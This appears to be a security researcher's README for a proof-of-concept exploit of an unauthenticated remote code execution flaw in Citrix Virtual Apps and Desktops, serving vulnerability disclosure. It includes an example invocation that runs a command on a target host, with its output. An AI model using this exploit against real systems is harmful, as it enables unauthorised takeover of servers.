# CVE-2024-xxxx
 Citrix Virtual Apps and Desktops (XEN) Unauthenticated Remote Code execution
 
 See our [blog post](https://labs.watchtowr.com/visionaries-at-citrix-have-democratised-remote-network-access-citrix-virtual-apps-and-desktops-cve-unknown/) for technical details




https://github.com/user-attachments/assets/563fd110-5321-49f7-8dc3-48eb0a53e0f9




# PoC in Action


```
python exploit-citrix-xen.py --target 192.168.1.120 --port 80 --cmd "whoami"
                         __         ___  ___________
         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________
         \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|
                                  \/          \/     \/

        CVE-xxxx-xxxxx.py
        (*) Citrix Virtual Apps and Desktops Unauthenticated Remote Code Execution (CVE-xxxx-xxxxx) exploit by watchTowr

          - Sina Kheirkhah (@SinSinology), watchTowr (sina@watchTowr.com)

        CVEs: [CVE-xxxx-xxxxx]

[INFO] Command sent to 192.168.1.120 successfully!

```


# Affected Versions

Any version from Citrix Virtual Apps and Desktops 7 2402 LTSR and before are vulnerable, more details at [citrix advisory](https://support.citrix.com/s/article/CTX691941-citrix-session-recording-security-bulletin-for-cve20248068-and-cve20248069?language=en_US)


# Exploit authors

This exploit was written by [Sina Kheirkhah (@SinSinology)](https://x.com/SinSinology) of [watchTowr (@watchtowrcyber)](https://twitter.com/watchtowrcyber) 


# Follow [watchTowr](https://watchTowr.com) Labs

For the latest security research follow the [watchTowr](https://watchTowr.com) Labs Team 

- https://labs.watchtowr.com/
- https://x.com/watchtowrcyber
